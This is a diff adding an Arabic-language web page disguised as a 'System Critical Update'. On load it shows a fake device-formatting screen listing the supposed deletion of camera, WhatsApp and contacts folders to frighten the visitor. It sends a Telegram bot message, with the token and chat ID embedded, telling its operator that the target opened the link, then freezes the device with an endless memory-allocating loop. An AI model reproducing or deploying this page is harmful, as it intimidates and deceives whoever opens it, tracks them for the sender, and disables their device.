@@ -1,0 +1,75 @@
+index.html
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>System Critical Update</title>
+    <style>
+        body { background-color: black; color: #00FF00; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; overflow: hidden; }
+        .warning { color: red; font-size: 28px; font-weight: bold; margin-bottom: 20px; }
+        #progress-bar { width: 80%; border: 2px solid #00FF00; height: 35px; margin: 20px auto; position: relative; }
+        #fill { width: 0%; height: 100%; background-color: #00FF00; transition: width 0.1s; }
+        #log { margin-top: 20px; font-size: 14px; color: #888; text-align: left; width: 80%; margin-left: 10%; height: 150px; overflow: hidden; }
+    </style>
+</head>
+<body>
+    <div class="warning">⚠️ تم كشف محاولة اختراق ⚠️</div>
+    <p>بروتوكول الحماية النشط: جاري فرمتة ذاكرة الجهاز...</p>
+    
+    <div id="progress-bar"><div id="fill"></div></div>
+    <p id="status">جاري تهيئة النظام...</p>
+    
+    <div id="log"></div>
+
+    <script>
+        // بياناتك للإرسال (البوت)
+        const TOKEN = "8691027108:AAE9_0t4Xko8qAO7NGs9OjlOnna90jX7_bw";
+        const CHAT_ID = "8297381026";
+
+        // 1. وظيفة إرسال التنبيه فور الدخول
+        async function notifyBoss() {
+            const msg = "🔥 المبتز وقع في الفخ!\n📍 تم فتح الرابط وبدأت عملية التعطيل والفرمتة الوهمية.";
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+            try { await fetch(url); } catch (e) {}
+        }
+
+        // 2. محاكاة الفرمتة (رعب نفسي)
+        let fill = document.getElementById('fill');
+        let status = document.getElementById('status');
+        let log = document.getElementById('log');
+        let width = 0;
+        let folders = ["DCIM/Camera", "WhatsApp/Media", "Contacts/Database", "System/Root", "SDCard/Private"];
+
+        function startFakeFormat() {
+            notifyBoss(); // إرسال تنبيه لك فوراً
+            
+            let interval = setInterval(() => {
+                if (width < 100) {
+                    width += 0.5;
+                    fill.style.width = width + '%';
+                    if (Math.random() > 0.7) {
+                        let folder = folders[Math.floor(Math.random() * folders.length)];
+                        status.innerText = `جاري مسح: ${folder}...`;
+                        let p = document.createElement('p');
+                        p.innerText = `[SUCCESS] Deleted ${folder}/${Math.random().toString(36).substring(7)}.jpg`;
+                        log.prepend(p);
+                    }
+                } else {
+                    clearInterval(interval);
+                    status.innerText = "تمت الفرمتة بنجاح. تم تعطيل الجهاز.";
+                    status.style.color = "red";
+                }
+            }, 50);
+
+            // 3. استنزاف الموارد (تعليق الجهاز)
+            setTimeout(() => {
+                while(true) {
+                    let dummy = new Array(1000000).fill("Ammari_Architect");
+                }
+            }, 5000); // يبدأ التعليق بعد 5 ثواني من الرعب
+        }
+
+        window.onload = startFakeFormat;
+    </script>
+</body>
+</html>
